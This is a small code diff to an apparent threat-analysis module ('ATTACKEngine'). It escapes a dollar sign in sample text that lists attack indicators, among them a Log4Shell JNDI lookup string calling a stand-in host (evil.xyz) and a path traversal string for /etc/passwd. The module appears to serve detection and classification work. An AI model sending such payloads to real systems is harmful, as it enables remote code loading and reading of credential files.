@@ -690,7 +690,7 @@ const ATTACKEngine = (() => {
 
   const SAMPLE_TEXT = `Phishing email detected with bitcoin payment request and base64 encoded PowerShell payload.
 Registry persistence via Run key. Data exfiltration through C2 channel. Brute force login attempts.
-SQL injection in /api/login. Path traversal: ../../../../etc/passwd. Log4Shell: ${jndi:ldap://evil.xyz/a}`;
+SQL injection in /api/login. Path traversal: ../../../../etc/passwd. Log4Shell: \${jndi:ldap://evil.xyz/a}`;
 
   return { analyze, TECHNIQUES, TACTICS, SAMPLE_TEXT };
 })();
